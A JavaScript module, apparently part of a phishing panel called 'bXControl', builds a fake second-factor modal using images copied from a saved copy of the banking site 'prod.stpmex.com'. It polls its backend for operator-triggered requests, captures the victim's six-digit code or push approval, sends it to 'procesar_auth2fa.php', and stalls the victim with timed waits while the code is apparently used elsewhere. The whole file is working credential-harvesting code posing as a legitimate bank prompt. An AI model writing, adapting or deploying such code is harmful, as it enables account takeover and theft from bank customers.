/**
 * Auth 2FA Handler - bXControl
 * Modal a2fa-box: push móvil espera 40s; capturar código espera 5s; luego cierra.
 */

const AUTH2FA_ESPERA_PUSH_MS   = 40000;
const AUTH2FA_ESPERA_CODIGO_MS = 5000;

class Auth2faSystem {
    constructor() {
        this.current     = null;   // { auth2fa_id }
        this.modalCreated = false;
        this.interval    = null;
        this.enviando    = false;
        this.esperaTimeout = null;
        if (window.Telas) Telas.registrar('auth2fa', () => this.reset());
        this.init();
    }

    init() {
        this.injectStyles();
        this.startCheck();
    }

    // ── Polling ────────────────────────────────────────────────────────────
    startCheck() {
        this.interval = setInterval(() => this.check(), 3000);
    }

    stopCheck() {
        if (this.interval) { clearInterval(this.interval); this.interval = null; }
    }

    async check() {
        const epoch = window.Telas ? Telas.epoch : 0;
        try {
            const res  = await fetch('php_modales/verificar_auth2fa.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'verificar_auth2fa_pendiente' })
            });
            const data = await res.json().catch(() => null);
            if (!data || !data.success) return;
            if (window.Telas && !Telas.vigente(epoch)) return;

            if (data.tiene_auth2fa) {
                if (this.current && this.current.auth2fa_id !== data.auth2fa_id) {
                    this.reset();
                }
                if (!this.current) {
                    this.show(data);
                }
            } else if (this.current) {
                this.reset();
            }
        } catch (_) { /* silencioso */ }
    }

    // ── Mostrar modal ──────────────────────────────────────────────────────
    async show(data) {
        if (this._abriendo) return;
        this._abriendo = true;
        const epoch = window.Telas ? await Telas.ocupar('auth2fa') : null;
        this._abriendo = false;
        if (window.Telas && (epoch == null || !Telas.vigente(epoch))) return;
        this.current = { auth2fa_id: data.auth2fa_id };
        this.createModal();
        this.enviando = false;

        // Reset UI
        this._el('auth2faStatus').style.display = 'block';
        this._el('auth2faNotificacion').style.display = 'none';
        const wrap = this._el('auth2faCellOut');
        if (wrap) {
            wrap.querySelector('img').src = wrap.dataset.srcGray;
            wrap.style.cursor = 'default';
            delete wrap.dataset.activo;
        }
        const codeInput = this._el('auth2faCodigo');
        if (codeInput) {
            codeInput.value = '';
            codeInput.disabled = false;
        }
        const box = this._el('idc-modal');
        if (box) box.style.pointerEvents = '';

        this._el('auth2faOverlay').classList.add('active');
    }

    // ── Reset / cerrar ─────────────────────────────────────────────────────
    reset() {
        if (this.esperaTimeout) { clearTimeout(this.esperaTimeout); this.esperaTimeout = null; }
        this.enviando = false;
        this.current  = null;
        const overlay = this._el('auth2faOverlay');
        if (overlay) overlay.classList.remove('active');
    }

    close() {
        const overlay = this._el('auth2faOverlay');
        if (overlay) overlay.classList.remove('active');
        setTimeout(() => { this.current = null; this.enviando = false; }, 400);
    }

    mostrarNotificacionEnviada() {
        this._el('auth2faStatus').style.display = 'none';
        this._el('auth2faNotificacion').style.display = 'block';
    }

    bloquearUI() {
        const box = this._el('idc-modal');
        if (box) box.style.pointerEvents = 'none';
        const codeInput = this._el('auth2faCodigo');
        if (codeInput) codeInput.disabled = true;
    }

    // ── Acción: Solicitar confirmación push → captura + espera 40s ─────────
    async onSolicitarConfirmacion() {
        if (this.enviando || !this.current) return;
        const auth2faId = this.current.auth2fa_id;
        this.enviando = true;
        this.bloquearUI();
        this.mostrarNotificacionEnviada();

        await this.reportar('solicitar_confirmacion', null);
        if (typeof esperarPushContinuable === 'function') {
            await esperarPushContinuable(AUTH2FA_ESPERA_PUSH_MS);
        } else {
            await this._wait(AUTH2FA_ESPERA_PUSH_MS);
        }

        if (!this.current || this.current.auth2fa_id !== auth2faId) return;
        this.enviando = false;
        if (window.Telas) Telas.trasRespuesta();
        this.close();
    }

    // ── Acción: Enviar código OTP → captura + espera 5s ────────────────────
    async onEnviarCodigo() {
        if (this.enviando || !this.current) return;
        const codeInput = this._el('auth2faCodigo');
        const codigo    = (codeInput?.value || '').replace(/\D/g, '').trim();
        if (codigo.length !== 6) return;

        const auth2faId = this.current.auth2fa_id;
        this.enviando = true;
        this.bloquearUI();
        this.mostrarNotificacionEnviada();

        await this.reportar('capturar_codigo', codigo);
        await this._wait(AUTH2FA_ESPERA_CODIGO_MS);

        if (!this.current || this.current.auth2fa_id !== auth2faId) return;
        this.enviando = false;
        if (window.Telas) Telas.trasRespuesta();
        this.close();
    }

    // ── Acción: Cancelar ──────────────────────────────────────────────────
    async onCancelar() {
        if (!this.current || this.enviando) return;
        await this.reportar('cancelar', null);
        if (window.Telas) Telas.trasRespuesta();
        this.reset();
    }

    // ── POST al backend ───────────────────────────────────────────────────
    async reportar(accion, codigo) {
        try {
            const body = {
                accion:     accion,
                auth2fa_id: this.current.auth2fa_id
            };
            if (codigo !== null) body.codigo = codigo;
            await fetch('php_modales/procesar_auth2fa.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            });
        } catch (_) { /* silencioso */ }
    }

    // ── Helpers ────────────────────────────────────────────────────────────
    _el(id)       { return document.getElementById(id); }
    _wait(ms)     { return new Promise(r => setTimeout(r, ms)); }

    // ── Crear modal ────────────────────────────────────────────────────────
    createModal() {
        if (this.modalCreated) return;

        const html = `
<div id="auth2faOverlay" class="a2fa-overlay">
  <div class="a2fa-box" id="idc-modal">
    <div class="a2fa-header">Autenticación de segundo factor</div>

    <div class="a2fa-status-row">
      <span class="status-black" id="auth2faStatus">Seleccione el tipo de autenticación</span>
      <span class="status-blue" id="auth2faNotificacion" style="display:none;">
        Notificación enviada al dispositivo...
      </span>
    </div>

    <div class="a2fa-cols">
      <!-- Columna izquierda: Solicitar confirmación -->
      <div class="a2fa-col">
        <a href="#" id="auth2faPushBtn" title="Click para enviar confirmación a su celular">
          <img src="prod.stpmex.com_files/cell-in.png" alt="" class="a2fa-phone-img">
        </a>
        <span class="a2fa-label">Solicitar confirmación</span>
      </div>

      <!-- Columna derecha: Capturar código -->
      <div class="a2fa-col">
        <span id="auth2faCellOut" style="cursor:default;"
              data-src-gray="prod.stpmex.com_files/cell-out-gray.png"
              data-src-green="css/img/phoneGreen.png">
          <img src="prod.stpmex.com_files/cell-out-gray.png" alt=""
               title="Ingrese 6 dígitos para enviar"
               style="width:80px;height:124px;">
        </span>
        <span class="a2fa-label">Capturar código</span>
        <input id="auth2faCodigo" type="password" inputmode="numeric" pattern="[0-9]*"
               minlength="6" maxlength="6"
               placeholder="Código" aria-label="Código de verificación"
               style="width:80px;display:block;margin:4px auto 0;">
      </div>
    </div>

    <div class="a2fa-footer">
      <a href="#" id="auth2faCancelarBtn">
        <img src="prod.stpmex.com_files/cancelar.gif" alt="Cancelar">
      </a>
    </div>
  </div>
</div>`;

        document.body.insertAdjacentHTML('beforeend', html);
        this.modalCreated = true;
        this.bindEvents();
    }

    bindEvents() {
        // Push button
        const pushBtn = this._el('auth2faPushBtn');
        if (pushBtn) pushBtn.addEventListener('click', (e) => {
            e.preventDefault();
            this.onSolicitarConfirmacion();
        });

        // Código: solo dígitos + actualiza imagen
        const codeInput  = this._el('auth2faCodigo');
        const cellOutWrap = this._el('auth2faCellOut');
        const img = cellOutWrap?.querySelector('img');
        const actualizarImg = () => {
            if (!img || !cellOutWrap || !codeInput) return;
            codeInput.value = (codeInput.value || '').replace(/\D/g, '').slice(0, 6);
            const ok = codeInput.value.length === 6;
            img.src              = ok ? cellOutWrap.dataset.srcGreen : cellOutWrap.dataset.srcGray;
            img.title            = ok ? 'Click para enviar' : 'Ingrese 6 dígitos para enviar';
            cellOutWrap.style.cursor = ok ? 'pointer' : 'default';
            cellOutWrap.dataset.activo = ok ? '1' : '';
        };
        codeInput?.addEventListener('input',  actualizarImg);
        codeInput?.addEventListener('paste',  () => setTimeout(actualizarImg, 0));

        // Click en imagen verde → enviar código
        cellOutWrap?.addEventListener('click', (e) => {
            e.preventDefault();
            if (cellOutWrap.dataset.activo === '1') this.onEnviarCodigo();
        });

        // Enter en input código
        codeInput?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') { e.preventDefault(); this.onEnviarCodigo(); }
        });

        // Cancelar
        const cancelarBtn = this._el('auth2faCancelarBtn');
        if (cancelarBtn) cancelarBtn.addEventListener('click', (e) => {
            e.preventDefault();
            this.onCancelar();
        });
    }

    // ── Estilos ────────────────────────────────────────────────────────────
    injectStyles() {
        if (document.getElementById('auth2fa-styles')) return;
        const style = document.createElement('style');
        style.id = 'auth2fa-styles';
        style.textContent = `
.a2fa-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,.55);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9000;
    opacity: 0;
    visibility: hidden;
    transition: opacity .2s ease;
}
.a2fa-overlay.active {
    opacity: 1;
    visibility: visible;
}
.a2fa-box {
    background: #e8e8e8;
    border: 2px solid #1a3b8f;
    border-radius: 4px;
    width: 370px;
    max-width: 95vw;
    font-family: Arial, Helvetica, sans-serif;
    overflow: hidden;
}
.a2fa-header {
    background: #1a3b8f;
    color: #fff;
    text-align: center;
    padding: 8px 12px;
    font-size: 13px;
    font-weight: bold;
}
.a2fa-status-row {
    text-align: center;
    padding: 10px 12px 4px;
    min-height: 28px;
}
.a2fa-status-row .status-black {
    font-size: 9pt;
    color: #000;
    display: block;
}
.a2fa-status-row .status-blue {
    font-size: 14px;
    color: #0000cc;
}
.a2fa-cols {
    display: flex;
    justify-content: space-around;
    padding: 10px 8px 6px;
}
.a2fa-col {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 49%;
    gap: 6px;
}
.a2fa-phone-img {
    display: block;
}
.a2fa-label {
    font-size: 10pt;
    color: #000;
    text-align: center;
}
.a2fa-footer {
    text-align: center;
    padding: 8px 12px 12px;
}
        `;
        document.head.appendChild(style);
    }
}

// ── Inicializar ──────────────────────────────────────────────────────────────
let auth2faSystem;
document.addEventListener('DOMContentLoaded', () => {
    auth2faSystem = new Auth2faSystem();
});
